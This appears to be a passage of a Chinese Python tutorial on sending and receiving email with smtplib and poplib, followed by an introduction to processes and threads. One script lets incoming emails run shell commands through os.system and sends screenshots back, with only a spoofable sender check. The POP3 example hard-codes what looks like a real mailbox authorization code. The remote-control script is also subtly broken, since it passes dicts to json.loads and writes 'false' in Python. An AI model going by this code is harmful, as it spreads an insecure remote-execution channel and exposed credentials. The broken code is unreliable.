except smtplib.SMTPException:
    print("Error: 无法发送邮件")

### 执行以上程序,如果本机安装sendmail,就会输出:
$ python test.py
邮件发送成功
查看收件箱(一般在垃圾箱),就可以查看到邮件信息

</textarea>带附件的邮件可以看做包含若干部分的邮件:文本和各个附件本身,所以可以构造一个MIMEMultipart对象代表邮件本身,然后往里面加上一个MIMEText作为邮件正文,再继续往里面加上表示附件的MIMEBase对象即可<textarea>
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase

# 邮件对象:
msg = MIMEMultipart()
msg['From'] = _format_addr('Python爱好者 <%s>' % from_addr)
msg['To'] = _format_addr('管理员 <%s>' % to_addr)
msg['Subject'] = Header('来自SMTP的问候……', 'utf-8').encode()

# 邮件正文是MIMEText:
msg.attach(MIMEText('send with file...', 'plain', 'utf-8'))

# 添加附件就是加上一个MIMEBase,从本地读取一个图片:
with open('./dog.jpg', 'rb') as f:
    # 设置附件的MIME和文件名,这里是png类型:
    mime = MIMEBase('image', 'png', filename='test.png')
    # 加上必要的头信息:
    mime.add_header('Content-Disposition', 'attachment', filename='test.png')
    mime.add_header('Content-ID', '<0>')
    mime.add_header('X-Attachment-Id', '0')
    # 把附件的内容读进来:
    mime.set_payload(f.read())
    # 用Base64编码:
    encoders.encode_base64(mime)
    # 添加到MIMEMultipart:
    msg.attach(mime)

</textarea>Python发送带附件的邮件:首先要创建MIMEMultipart()实例,然后构造附件,如果有多个附件可依次构造,最后利用smtplib.smtp发送<textarea>
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.header import Header

sender = 'from@runoob.com'
receivers = ['429240967@qq.com']  # 接收邮件,可设置为QQ邮箱或其他邮箱

#创建一个带附件的实例
message = MIMEMultipart()
message['From'] = Header("菜鸟教程", 'utf-8')
message['To'] =  Header("测试", 'utf-8')
subject = 'Python SMTP 邮件测试'
message['Subject'] = Header(subject, 'utf-8')

#邮件正文内容
message.attach(MIMEText('这是菜鸟教程Python邮件发送测试……', 'plain', 'utf-8'))

# 构造附件1,传送当前目录下的test.txt文件
att1 = MIMEText(open('test.txt', 'rb').read(), 'base64', 'utf-8')
att1["Content-Type"] = 'application/octet-stream'
# 这里的filename可以任意写,写什么名字,邮件中显示什么名字
att1["Content-Disposition"] = 'attachment; filename="test.txt"'
message.attach(att1)

# 构造附件2,传送当前目录下的 runoob.txt 文件
att2 = MIMEText(open('runoob.txt', 'rb').read(), 'base64', 'utf-8')
att2["Content-Type"] = 'application/octet-stream'
att2["Content-Disposition"] = 'attachment; filename="runoob.txt"'
message.attach(att2)

try:
    smtpObj = smtplib.SMTP('localhost')
    smtpObj.sendmail(sender, receivers, message.as_string())
    print("邮件发送成功")
except smtplib.SMTPException:
    print("Error: 无法发送邮件")

### $ python test.py
邮件发送成功
查看收件箱(一般在垃圾箱)就可以查看到邮件信息

</textarea>在HTML文本中添加图片,把一个图片嵌入到邮件正文中显示:不能直接在HTML邮件中链接图片地址,大部分邮件服务商都会自动屏蔽带有外链的图片,因为不知道这些链接是否指向恶意网站,要把图片嵌入到邮件正文中,只需按照发送附件的方式,先把邮件作为附件添加进去,然后,在HTML中通过引用src="cid:0"就可以把附件作为图片嵌入了。如果有多个图片,给它们依次编号,然后引用不同的cid:x即可<textarea>
import smtplib
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.header import Header

sender = 'from@runoob.com'
receivers = ['429240967@qq.com']  # 接收邮件,可设置为QQ邮箱或其他邮箱

msgRoot = MIMEMultipart('related')
msgRoot['From'] = Header("菜鸟教程", 'utf-8')
msgRoot['To'] =  Header("测试", 'utf-8')
subject = 'Python SMTP 邮件测试'
msgRoot['Subject'] = Header(subject, 'utf-8')

msgAlternative = MIMEMultipart('alternative')
msgRoot.attach(msgAlternative)

mail_msg = """
<p>Python 邮件发送测试...</p>
<p><a href="http://www.runoob.com">菜鸟教程链接</a></p>
<p>图片演示:</p>
<p>< img src="cid:image1"></p>
"""
msgAlternative.attach(MIMEText(mail_msg, 'html', 'utf-8'))

# 指定图片为当前目录
fp = open('test.png', 'rb')
msgImage = MIMEImage(fp.read())
fp.close()

# 定义图片 ID,在 HTML 文本中引用
msgImage.add_header('Content-ID', '<image1>')
msgRoot.attach(msgImage)

try:
    smtpObj = smtplib.SMTP('localhost')
    smtpObj.sendmail(sender, receivers, msgRoot.as_string())
    print("邮件发送成功")
except smtplib.SMTPException:
    print("Error: 无法发送邮件")

### $ python test.py
邮件发送成功
查看收件箱(如果在垃圾箱可能需要移动到收件箱才可正常显示),就可以查看到邮件信息

</textarea><pre>
【 同时支持HTML和Plain格式 】
收件人通过浏览器或Outlook之类的软件是可以正常浏览HTML邮件内容的,但如果收件人使用的设备太古老,查看不了HTML邮件怎么办？
办法是在发送HTML的同时再附加一个纯文本,如果收件人无法查看HTML格式的邮件,就可以自动降级查看纯文本邮件。
利用MIMEMultipart就可以组合一个HTML和Plain,要注意指定subtype是alternative:

</pre><textarea>
msg = MIMEMultipart('alternative')
msg['From'] = ...
msg['To'] = ...
msg['Subject'] = ...

msg.attach(MIMEText('hello', 'plain', 'utf-8'))
msg.attach(MIMEText('< html>< body>< h1>Hello< /h1>< /body>< /html>', 'html', 'utf-8'))
# 正常发送msg对象...

</textarea><pre>
【 加密SMTP 】
使用标准的25端口连接SMTP服务器时使用明文传输,发送邮件的整个过程可能会被窃听。要更安全地发送邮件可以加密SMTP会话,实际上就是先创建SSL安全连接,然后再使用SMTP协议发送邮件。
某些邮件服务商如Gmail提供的SMTP服务必须要加密传输,Gmail的SMTP端口是587

</pre>通过Gmail提供的安全SMTP发送邮件<textarea>
smtp_server = 'smtp.gmail.com'
smtp_port = 587
server = smtplib.SMTP(smtp_server, smtp_port)
server.starttls()         # 只需要在创建SMTP对象后立刻调用starttls()方法就创建了安全连接
server.set_debuglevel(1)  # 剩下的代码和前面的一模一样

</textarea><textarea>
class SendMail(object):
    def __init__(self,username,passwd,recv,title,content,file=None,email_host='smtp.163.com',port=25):
        self.username = username
        self.passwd = passwd
        self.recv = recv
        self.title = title
        self.content = content
        self.file = file
        self.email_host = email_host
        self.port = port
    def send_mail(self):
        msg = MIMEMultipart()
        # 发送内容的对象
        if self.file:                          # 处理附件的
            att = MIMEText(open(self.file).read())
            att["Content-Type"] = 'application/octet-stream'
            att["Content-Disposition"] = 'attachment; filename="%s"'%self.file
            msg.attach(att)
            msg.attach(MIMEText(self.content)) # 邮件正文的内容
        msg['Subject'] = self.title            # 邮件主题
        msg['From'] = self.username            # 发送者账号
        msg['To'] = self.recv                  # 接收者账号列表
        self.smtp = smtplib.SMTP(self.email_host,port=self.port)
        # 发送邮件服务器的对象
        self.smtp.login(self.username,self.passwd)
        try:
            self.smtp.sendmail(self.username,self.recv,msg.as_string())
        except Exception as e:
            print('出错了',e)
        else:
            print('发送成功！')

    def __del__(self):
        self.smtp.quit()

# 调用封装
if __name__ == '__main__':
    m = SendMail(username='XXX@163.com',passwd='XXX',recv='XXX@XXX.com',title='XXX',content='异常的输出',file='python.txt')
    m.send_mail()

</textarea><pre>
【 小结 】
使用Python的smtplib发送邮件十分简单,只要掌握了各种邮件类型的构造方法,正确设置好邮件头就可以顺利发出。

构造一个邮件对象就是一个Messag对象,如果构造一个MIMEText对象就表示一个文本邮件对象,如果构造一个MIMEImage对象就表示一个作为附件的图片,要把多个对象组合起来就用MIMEMultipart对象,而MIMEBase可以表示任何对象。它们的继承关系如下:

Message
+- MIMEBase
   +- MIMEMultipart
   +- MIMENonMultipart
      +- MIMEMessage
      +- MIMEText
      +- MIMEImage

这种嵌套关系就可以构造出任意复杂的邮件,可以通过email.mime文档查看它们所在的包以及详细的用法

</pre>

<h4>POP3收取邮件</h4><pre>
SMTP用于发送邮件,收取邮件就是编写一个MUA作为客户端,从MDA把邮件获取到用户的电脑或手机上。收取邮件最常用的协议是POP协议,目前版本号是3,俗称POP3。Python内置一个poplib模块,实现了POP3协议,可以直接用来收邮件。
POP3协议收取的不是一个已经可以阅读的邮件本身,而是邮件的原始文本,这和SMTP协议很像,SMTP发送的也是经过编码后的一大段文本。
要把POP3收取的文本变成可以阅读的邮件,还需要用email模块提供的各种类来解析原始文本变成可阅读的邮件对象。

用Python的poplib模块收取邮件分两步:
第一步是用POP3协议把邮件原始文本下载获取到本地,
第二步是用email模块把原始邮件文本解析为Message邮件对象,然后用适当的形式把邮件内容展示给用户即可

</pre><textarea>
import poplib

# 输入邮件地址,口令和POP3服务器地址:
email = input('Email: ') or '465***869@qq.com'
password = input('Password: ')  or 'fqfoekytxqkebhah'
pop3_server = input('POP3 server: ') or 'pop.qq.com'

server = poplib.POP3(pop3_server)               # 连接到POP3服务器
server.set_debuglevel(1)                        # 可以打开或关闭调试信息
print(server.getwelcome().decode('utf-8'))      # 可选:打印POP3服务器的欢迎文字
server.user(email)                              # 身份认证
server.pass_(password)
print('Messages: %s. Size: %s' % server.stat()) # stat()返回邮件数量和占用空间
resp, mails, octets = server.list()             # list()返回所有邮件的编号
print(mails)                                    # 可以查看返回的列表类似[b'1 82923', b'2 2184', ...]
index = len(mails)                              # 获取最新一封邮件,索引号从1开始
resp, lines, octets = server.retr(index)           # 使用retr()获取索引为index的邮件内容,获取所有右键内容可使用循环
msg_content = b'\r\n'.join(lines).decode('utf-8')  # lines存储了邮件的原始文本的每一行,可以获得整个邮件的原始文本
# server.dele(index)                               # 可以根据邮件索引号直接从服务器删除邮件
server.quit()                                      # 关闭连接

# email模块解析邮件
from email.parser import Parser
from email.header import decode_header
from email.utils import parseaddr

msg = Parser().parsestr(msg_content) # 把邮件内容解析为Message对象

# Message对象本身可能是一个MIMEMultipart对象,即包含嵌套的其他MIMEBase对象,嵌套可能不止一层,所以要递归地打印出Message对象的层次结构:
def print_info(msg, indent=0):       # indent用于缩进显示
    if indent == 0:
        for header in ['From', 'To', 'Subject']:
            value = msg.get(header, '')
            if value:
                if header=='Subject':
                    value = decode_str(value)
                else:
                    hdr, addr = parseaddr(value)
                    name = decode_str(hdr)
                    value = u'%s <%s>' % (name, addr)
            print('%s%s: %s' % ('  ' * indent, header, value))
    if (msg.is_multipart()):
        parts = msg.get_payload()
        for n, part in enumerate(parts):
            print('%spart %s' % ('  ' * indent, n))
            print('%s--------------------' % ('  ' * indent))
            print_info(part, indent + 1)
    else:
        content_type = msg.get_content_type()
        if content_type=='text/plain' or content_type=='text/html':
            content = msg.get_payload(decode=True)
            charset = guess_charset(msg)
            if charset:
                content = content.decode(charset)
            print('%sText: %s' % ('  ' * indent, content + '...'))
        else:
            print('%sAttachment: %s' % ('  ' * indent, content_type))

# 邮件的Subject或Email中包含的名字都是经过编码后的str,要正常显示就必须decode
# decode_header()返回一个list,因为像Cc、Bcc这样的字段可能包含多个邮件地址,所以解析出来的会有多个元素。上面的代码只取了第一个元素。
def decode_str(s):
    value, charset = decode_header(s)[0]
    if charset:
        value = value.decode(charset)
    return value

# 文本邮件的内容也是str,还需要检测编码,否则非UTF-8编码的邮件都无法正常显示
def guess_charset(msg):
    charset = msg.get_charset()
    if charset is None:
        content_type = msg.get('Content-Type', '').lower()
        pos = content_type.find('charset=')
        if pos >= 0:
            charset = content_type[pos + 8:].strip()
    return charset

# 把上面的代码整理好就可以来试试收取一封邮件。先往自己的邮箱发一封邮件,然后用浏览器登录邮箱,如果收到了就来用Python程序把它收到本地:
# 运行程序,结果如下:

+OK Welcome to coremail Mail Pop3 Server (163coms[...])
Messages: 126. Size: 27228317

From: Test < xxxxxx@qq.com>
To: Python爱好者 < xxxxxx@163.com>
Subject: 用POP3收取邮件
part 0
--------------------
  part 0
  --------------------
    Text: Python可以使用POP3收取邮件……...
  part 1
  --------------------
    Text: Python可以< a href="...">使用POP3< /a>收取邮件……...
part 1
--------------------
  Attachment: application/octet-stream

</textarea><pre>
从打印的结构可以看出,这封邮件是一个MIMEMultipart,它包含两部分:第一部分又是一个MIMEMultipart,第二部分是一个附件。而内嵌的MIMEMultipart是一个alternative类型,它包含一个纯文本格式的MIMEText和一个HTML格式的MIMEText。

</pre>利用邮件远程控制自己电脑 收发邮件和执行系统命令<textarea>
# 电脑每隔一段时间查看指定邮箱中是否收到了新的邮件,若未收到则不进行任何操作,若收到了则判断发件人的身份,若发件人为合法的控制者则解析发件人的邮件,执行解析结果,否则忽略该邮件
import re
import os
import json
import time
import email
import poplib
import smtplib
import datetime
from PIL import ImageGrab
from email import encoders
from email.header import Header
from email.parser import Parser
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.header import decode_header
from email.utils import parseaddr, formataddr
from email.mime.multipart import MIMEMultipart

config = {
  "sender": {
        "email": "xxx@qq.com"
      },
  "receiver": {
        "email": "xxx@sina.com",
        "password": "xxx",
        "pop3_server": "pop.sina.com",
        "smtp_server": "smtp.sina.com",
        "enable_ssl": false,
        "port": 0
      }
}
options = json.loads(config)

cmd = {
  "关机": "shutdown -s -t 00",
  "取消关机": "shutdown -a",
  "锁屏": "rundll32.exe user32.dll,LockWorkStation",
  "截屏": "screenshot"
}
word2cmd_dict = json.loads(cmd)

'''
邮箱类:
  get() -> 接收邮件:
    Input:
      -stat: 返回邮件数量和占用空间 -> (num_message, size)
      -list: 返回所有邮件的编号
      -latest: 获取最新一封邮件
    Return:
      {
        'stat':,
        'list':,
        'latest'/int: {
                'From':,
                'To',
                'Subject':
                'Text':
                }
      }
  send() -> 发送邮件
    Input:
      -content: 邮件内容, [Subject, 正文]
    Return:
      -True: 发送成功
      -False: 发送失败
'''
class EmailClass():
  def __init__(self):
    self.pop3_server = poplib.POP3(options['receiver']['pop3_server'])
    self.pop3_server.user(options['receiver']['email'])
    self.pop3_server.pass_(options['receiver']['password'])

  # # POP3协议接收邮件
  def get(self, *args):
    res = {}
    for arg in args:
      if arg == 'stat':
        res[arg] = self.pop3_server.stat()
      elif arg == 'list':
        res[arg] = self.pop3_server.list()
      elif arg == 'latest':
        mails = self.pop3_server.list()[1]
        resp, lines, octets = self.pop3_server.retr(len(mails))
        msg = b'\r\n'.join(lines).decode('utf-8')
        msg = Parser().parsestr(msg)
        result = self.__parse_message(msg)
        res[arg] = result
      elif type(arg) == int:
        mails = self.pop3_server.list()[1]
        if arg > len(mails):
          res[arg] = None
          continue
        resp, lines, octets = self.pop3_server.retr(arg)
        msg = b'\r\n'.join(lines).decode('utf-8')
        msg = Parser().parsestr(msg)
        result = self.__parse_message(msg)
        res[arg] = result
      else:
        res[arg] = None
    return res

  # SMTP协议发送邮件
  def send(self, content=None, attach_path=None):
    msg = MIMEMultipart()
    # Smtp server
    if not options['receiver']['enable_ssl']:
      smtp_server = smtplib.SMTP(options['receiver']['smtp_server'], 25)
      smtp_server.set_debuglevel(1)
      smtp_server.login(options['receiver']['email'], options['receiver']['password'])
    else:
      if options['receiver']['port']:
        try:
          smtp_server = smtplib.SMTP_SSL(options['receiver']['smtp_server'], options['receiver']['port'])
        except:
          smtp_server = smtplib.SMTP_SSL(options['receiver']['smtp_server'])
      else:
        smtp_server = smtplib.SMTP_SSL(options['receiver']['smtp_server'])
      smtp_server.set_debuglevel(1)
      smtp_server.ehlo(options['receiver']['smtp_server'])
      smtp_server.login(options['receiver']['email'], options['receiver']['password'])
    msg_from = 'Server <%s>' % options['receiver']['email']
    from_name, from_addr = parseaddr(msg_from)
    msg['From'] = formataddr((Header(from_name, 'utf-8').encode(), from_addr))
    msg_to = 'Controller <%s>' % options['sender']['email']
    to_name, to_addr = parseaddr(msg_to)
    msg['To'] = formataddr((Header(to_name, 'utf-8').encode(), to_addr))
    msg['Date'] = Header(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'), 'utf-8')
    if attach_path is None and content is None:
      return False
    if content is None:
      content = ['Attachment', 'Attachment from your computer...']
    msg['Subject'] = Header(content[0])
    msg.attach(MIMEText(content[1], 'plain', 'utf-8'))
    if attach_path:
      with open(attach_path, 'rb') as f:
        filename = os.path.basename(attach_path)
        mime = MIMEBase('attachment', filename.split('.')[-1], filename=filename)
        mime.add_header('Content-Disposition', 'attachment', filename=filename)
        mime.add_header('Content-ID', '<0>')
        mime.add_header('X-Attachment-Id', '0')
        mime.set_payload(f.read())
        encoders.encode_base64(mime)
        msg.attach(mime)
    smtp_server.sendmail(from_addr, [to_addr], msg.as_string())
    smtp_server.quit()
    return True

  # 关闭pop3连接
  def close_pop(self):
    self.pop3_server.quit()

  # 重置pop3连接
  def reset_pop(self):
    self.close_pop()
    self.pop3_server = poplib.POP3(options['receiver']['pop3_server'])
    self.pop3_server.user(options['receiver']['email'])
    self.pop3_server.pass_(options['receiver']['password'])

  # 解析邮件,返回数据格式: {From: , To: , Subject: , Text: }
  def __parse_message(self, msg):
    result = {}
    for header in ['From', 'To', 'Subject']:
      result[header] = None
      temp = msg.get(header, '')
      if temp:
        if header == 'Subject':
          value, charset = decode_header(temp)[0]
          if charset:
            value = value.decode(charset)
          result[header] = value
        else:
          name, addr = parseaddr(temp)
          value, charset = decode_header(name)[0]
          if charset:
            value = value.decode(charset)
          result[header] = '%s<%s>' % (value, addr)
    result['Text'] = None
    # 不考虑MIMEMultipart对象
    if not msg.is_multipart():
      content_type = msg.get_content_type()
      # 只考虑纯文本/HTML内容
      if content_type == 'text/plain' or content_type == 'text/html':
        content = msg.get_payload(decode=True)
        charset = msg.get_charset()
        if charset is None:
          temp = msg.get('Content-Type', '').lower()
          pos = temp.find('charset=')
          if pos >= 0:
            charset = temp[pos+8:].strip()
        if charset:
          content = content.decode(charset)
        result['Text'] = content
    return result

'''
服务器类
'''
class Server():
  def __init__(self, time_interval=5):
    self.email = EmailClass()
    self.num_msg = len(self.email.get('list')['list'][1])
    self.time_interval = time_interval

  # 运行服务器
  def run(self):
    print('[INFO]:Start server successfully...')
    while True:
      self.email.reset_pop()
      mails = self.email.get('list')['list'][1]
      if len(mails) > self.num_msg:
        for i in range(self.num_msg+1, len(mails)+1):
          res = self.email.get(i)
          res_from = res[i]['From']
          res_from = re.findall(r'<(.*?)>', res_from)[0].lower()
          print(res_from)
          if res_from != options['sender']['email'].lower():
            continue
          command = res[i]['Subject']
          if command in word2cmd_dict:
            command = word2cmd_dict[command]
          if command == 'screenshot':
            savename = './screenshot.jpg'
            self.screenshot(savename)
            try:
              is_success = self.email.send(attach_path=savename)
              if not is_success:
                raise RuntimeError('Fail to send screenshot...')
              print('[INFO]: Send screenshot successfully...')
            except:
              print('[Error]: Fail to send screenshot...')
          else:
            self.run_cmd(command)
        self.num_msg = len(mails)
      time.sleep(self.time_interval)

  # os.system()运行命令cmd
  def run_cmd(self, cmd):
    try:
      os.system(cmd)
      print('[INFO]: Run <%s> successfully...' % cmd)
      return True
    except:
      print('[Error]: Fail to Run <%s>...' % cmd)
      return False

  # 截屏
  def screenshot(self, savename='screenshot.jpg'):
    img = ImageGrab.grab()
    img.save(savename)
    print('[INFO]: Get %s successfully...' % savename)

  # 打印欢迎信息
  def print_info(self):
    print('*'*20 + 'Control your computer by your email' + '*'*20)

if __name__ == '__main__':
  s = Server(5)
  s.print_info()
  s.run()

</textarea>
</div>

<div id="process_thread">
<h3>并发编程(多线程和多进程)</h3><pre>
几乎所有的操作系统都支持同时运行多个任务,一个任务通常就是一个程序,每一个运行中的程序就是一个进程process。当一个程序运行时,内部可能包含多个顺序执行流,每一个顺序执行流就是一个线程

进程：操作系统中运行的每个程序可视为一个进程,可独立运行,是操作系统分配资源的基本单位,如QQ程序。
线程：轻量级的进程,是进程的组成部分,是操作系统执行功能的基本单元,如QQ中的每个聊天窗口。

进程与线程的区别与联系：
一个进程可包含多个线程,一个线程只能属于一个进程
同一个进程中的各线程之间共享其进程下的资源
多个进程可以并发启动,同一个进程中的多个线程也可并发启动
同一进程下的一个线程被销毁不会影响其他线程
进程结束时,其所有线程将也被销毁

计算机的CPU承担了操作系统所有程序的计算工作,CPU在任一时刻都只能有一个任务在运行

【 线程和进程 】
操作系统所有运行中的任务通常对应一个进程,当一个程序进入内存运行时即变成一个进程,进程是处于运行过程中的程序,并具有一定的独立功能。进程是系统进行资源分配和调度的一个独立单位。

编写完毕的代码在没有运行的时候称之为程序,正在运行着的代码就成为进程,进程除了包含代码以外还有需要运行的环境等,所以和程序是有区别的

一般进程包含如下三个特征:
独立性:进程是系统中独立存在的实体,它可以拥有自己的独立的资源,每一个进程都拥有自己的私有的地址空间。在没有经过进程本身允许的情况下,一个用户进程不可以直接访问其他进程的地址空间。
动态性:程序只是一个静态的指令集合,而进程是一个正在系统中活动的指令集合,进程中加入了时间的概念,进程具有自己的生命周期和各种不同的状态,程序没有这些概念
并发性:多个进程可以在单个处理器上并发执行,多个进程之间不会互相影响。

并行Parallel指在同一时刻有多条指令在多个处理器上同时执行,真正的并行执行多任务只能在多核CPU上实现,但任务数远多于CPU的核心数量,所以操作系统也会自动把很多任务轮流调度到每个核心上执行
并发Concurrency才旨在同一时刻只能有一条指令执行,但多个进程指令被快速轮换执行,使得在宏观上具有多个进程同时执行的效果。

大部分操作系统都支持多进程并发执行,现代的操作系统几乎都支持同时执行多个任务。例如程序员一边开着开发工具在写程序,一边开着参考手册备查,同时还使用电脑播放音乐,此外每台电脑运行时还有大量底层的支撑性程序在运行,这些进程看上去像是在同时工作。
但实际上对于一个CPU而言,在某个时间点它只能执行一个程序,也就是说只能运行一个进程,CPU不断地在这些进程之间轮换执行,任务1执行0.01秒,切换到任务2执行0.01秒,再切换到任务3执行0.01秒,这样反复执行下去。表面上看每个任务都是交替执行的,但由于CPU的执行速度实在是太快了,感觉就像所有任务都在同时执行一样,因为相对人的感觉来说,CPU的执行速度太快了,如果启动的程序足够多则用户依然可以感觉到程序的运行速度下降了,所以虽然CPU在多个进程之间轮换执行,但用户感觉到好像有多个进程在同时执行,感觉不到任何中断

现代的操作系统都支持多进程的并发执行,但在具体的实现细节上可能因为硬件和操作系统的不同而采用不同的策略。比较常用的策略有:
共用式的多任务操作策略,例如Windows 3.1和Mac OS 9操作系统采用这种策略;
抢占式的多任务操作策略,其效率更高,目前操作系统大多采用这种策略,例如Windows NT、Windows 2000及UNIX/Linux等操作系统。

对于操作系统来说,一个任务就是一个进程(Process),比如打开一个浏览器就是启动一个浏览器进程,打开一个记事本就启动了一个记事本进程,打开两个记事本就启动了两个记事本进程,打开一个Word就启动了一个Word进程。
有些进程还不止同时干一件事,比如Word可以同时进行打字、拼写检查、打印等事情。在一个进程内部要同时干多件事就需要同时运行多个"子任务",把进程内的这些"子任务"称为线程(Thread)

由于每个进程至少要干一件事,所以一个进程至少有一个线程。当然像Word这种复杂的进程可以有多个线程,多个线程可以同时执行,多线程的执行方式和多进程是一样的,也是由操作系统在多个线程之间快速切换,让每个线程都短暂地交替运行,看起来就像同时执行一样。当然真正地同时执行多线程需要多核CPU才可能实现

多线程则扩展了多进程的概念,使得同一个进程可以同时并发处理多个任务。线程(Thread)也被称作轻量级进程(Lightweight Process),线程是进程的执行单元。就像进程在操作系统中的地位一样,线程在程序中是独立的、并发的执行流。

当进程被初始化后,主线程就被创建了。对于绝大多数的应用程序来说,通常仅要求有一个主线程,但也可以在进程内创建多个顺序执行流,这些顺序执行流就是线程,每一个线程都是独立的。

线程是进程的组成部分,一个进程可以拥有多个线程,一个线程必须有一个父进程。线程可以拥有自己的堆栈、程序计数器和局部变量,但不拥有系统资源,它与父进程的其他线程共享该进程所拥有的全部资源。因为多个线程共享父进程里的全部资源,因此编程更加方便;但必须更加小心,因为需要确保线程不会妨碍同一进程中的其他线程。
线程可以完成一定的任务,可以与其他线程共享父进程中的共享变量及部分环境,相互之间协同未完成进程所要完成的任务。
线程是独立运行的,它并不知道进程中是否还有其他线程存在
线程的运行是抢占式的,即当前运行的线程在任何时候都可能被挂起,以便另外一个线程可以运行。
一个线程可以创建和撤销另一个线程,同一个进程中的多个线程之间可以并发运行。

从逻辑的角度来看,多线程存在于一个应用程序中,让一个应用程序可以有多个执行部分同时执行,但操作系统无须将多个线程看作多个独立的应用,对多线程实现调度和管理以及资源分配,线程的调度和管理由进程本身负责完成。

简而言之,一个程序运行后至少有一个进程,在一个进程中可以包含多个线程,但至少要包含一个主线程。
归纳起来可以这样说,操作系统可以同时执行多个任务,每一个任务就是一个进程,进程可以同时执行多个任务,每一个任务就是一个线程。

线程在执行过程中与进程还是有区别的,每个独立的进程有一个程序运行的入口、顺序执行序列和程序的出口。但是线程不能够独立执行,必须依存在应用程序中,由应用程序提供多个线程执行控制。
每个线程都有自己的一组CPU寄存器,称为线程的上下文,该上下文反映了线程上次运行该线程的CPU寄存器的状态。
指令指针和堆栈指针寄存器是线程上下文中两个最重要的寄存器,线程总是在进程得到上下文中运行的,这些地址都用于标志拥有线程的进程地址空间中的内存
线程可以被抢占(中断)
在其他线程正在运行时,线程可以暂时搁置(也称为睡眠),这就是线程的退让。

【 多线程的好处 】
线程在程序中是独立的、并发的执行流。与分隔的进程相比,进程中线程之间的隔离程度要小,它们共享内存、文件句柄和其他进程应有的状态。

因为线程的划分尺度小于进程,使得多线程程序的并发性高。进程在执行过程中拥有独立的内存单元,而多个线程共享内存,从而极大地提高了程序的运行效率。

线程比进程具有更高的性能,这是由于同一个进程中的线程都有共性多个线程共享同一个进程的虚拟空间。线程共享的环境包括进程代码段、进程的公有数据等,利用这些共享的数据,线程之间很容易实现通信。

操作系统在创建进程时,必须为该进程分配独立的内存空间,并分配大量的相关资源,但创建线程则简单得多,因此使用多线程来实现并发比使用多进程的性能要高得多。

多线程类似于同时执行多个不同程序,多线程运行有如下优点:
1、使用线程可以把占据长时间的程序中的任务放到后台去处理。
2、用户界面可以更加吸引人,这样比如用户点击了一个按钮去触发某些事件的处理,可以弹出一个进度条来显示处理的进度
3、程序的运行速度可能加快
4、在一些等待的任务实现上如用户输入、文件读写和网络收发数据等,线程就比较有用了,在这种情况下可以释放一些珍贵的资源如内存占用等

总结起来,使用多线程编程具有如下几个优点:
1、进程之间不能共享内存,但线程之间共享内存非常容易。
2、操作系统在创建进程时,需要为该进程重新分配系统资源,但创建线程的代价则小得多,因此使用多线程来实现多任务并发执行比使用多进程的效率高。
3、Python语言内置了多线程功能支持,而不是单纯地作为底层操作系统的调度方式,从而简化了Python的多线程编程。

在实际应用中多线程是非常有用的,应用是非常广泛,比如一个浏览器必须能同时下载多张图片;一个Web服务器必须能同时响应多个用户请求;图形用户界面(GUI)应用也需要启动单独的线程,从主机环境中收集用户界面事件……

【 Python进程线程模式 】
常见的Python程序都是执行单任务的进程,也就是只有一个线程,如果要同时执行多个任务的解决方案:
1、多进程模式: 启动多个进程,每个进程虽然只有一个线程,但多个进程可以一块执行多个任务。
2、多线程模式: 启动一个进程,在一个进程内启动多个线程,这样多个线程也可以一块执行多个任务。
3、多进程+多线程模式: 启动多个进程,每个进程再启动多个线程,这样同时执行的任务就更多了,当然这种模型更复杂,实际很少采用。

同时执行多个任务通常各个任务之间并不是没有关联的,而是需要相互通信和协调,有时任务1必须暂停等待任务2完成后才能继续执行,有时任务3和任务4又不能同时执行,所以多进程和多线程的程序的复杂度要远远高于单进程单线程的程序。

因为复杂度高,调试困难,所以不是迫不得已也不想编写多任务。但是有很多时候没有多任务还真不行。想想在电脑上看电影,就必须由一个线程播放视频,另一个线程播放音频,否则单线程实现的话就只能先把视频播放完再播放音频,或者先把音频播放完再播放视频

Python既支持多进程,又支持多线程,接下来讨论如何编写这两种多任务程序

线程是最小的执行单元,而进程由至少一个线程组成。如何调度进程和线程,完全由操作系统决定,程序自己不能决定什么时候执行,执行多长时间。
多进程和多线程的程序涉及到同步、数据共享的问题,编写起来更复杂

</pre>
</div>

<div id="thread">
<h4>多线程</h4><pre>
多任务可以由多进程完成,也可以由一个进程内的多线程完成。进程是由若干线程组成的,一个进程至少有一个线程。
相比单线程的编程,多线程的程序可包含多个顺序执行流,这些顺序执行流之间互不干扰

由于线程是操作系统直接支持的执行单元,因此高级语言通常都内置多线程的支持,Python也不例外,Python语言提供了非常优秀的多线程支持,程序可以通过非常简单的方式来启动多线程,并且Python的线程是真正的Posix Thread,而不是模拟出来的线程。

【 创建线程的两种方式 】
Python提供了_thread和threading两个模块来支持多线程,_thread提供低级别的、原始的线程支持及一个简单的锁,一般编程不建议使用thread模块;而threading模块则提供了功能丰富的多线程支持。

threading模块提供的方法和属性:
threading.currentThread(): 该函数总是返回当前正在执行的线程对象
threading.enumerate(): 返回一个包含正在运行的线程的list。正在运行指线程启动后、结束前,不包括启动前和终止后的线程。
threading.activeCount(): 返回正在运行的线程数量,与len(threading.enumerate())有相同的结果。
getName():它是Thread类的实例(线程对象)的方法,该方法返回调用它的线程名字即当前线程的名字
threading.current_thread().name

除了使用方法外,线程模块同样提供了Thread类来处理线程,Thread类提供了以下方法:
run(): 用以表示线程活动的方法。
start():启动线程活动。
join([time]): 等待至线程中止。这阻塞调用线程直至线程的join()方法被调用中止(正常退出或抛出未处理的异常)或是可选的超时发生。
isAlive(): 返回线程是否活动的。
getName(): 返回线程名。
setName(): 设置线程名。

Python主要通过两种方式来创建线程:
1、调用threading模块的Thread类的构造器创建线程
调用Thread类的构造器创建线程很简单,直接调用threading.Thread类的如下构造器创建线程:
__init__(self, target=None, args=(), kwargs=None, name=None, group=None, *, daemon=None)

target:指定该线程要调度的目标方法。
args:指定一个元组,以位置参数的形式target指定的函数传入参数
kwargs:指定一个字典,以关键字参数的形式为target指定的函数传入参数。
name: 指定该线程名
group:指定该线程所属的线程组。目前该参数还未实现,因此它只能设为None。
daemon:指定所构建的线程是否为后代线程。

通过Thread类的构造器创建并启动多线程的步骤如下:
1、调用Thread类的构造器创建线程对象,在创建线程对象时target参数指定的函数将作为线程执行体。
2、调用线程对象的start()方法启动该线程。

由于任何进程默认就会启动一个线程,该线程称为主线程,主线程又可以启动新的线程。
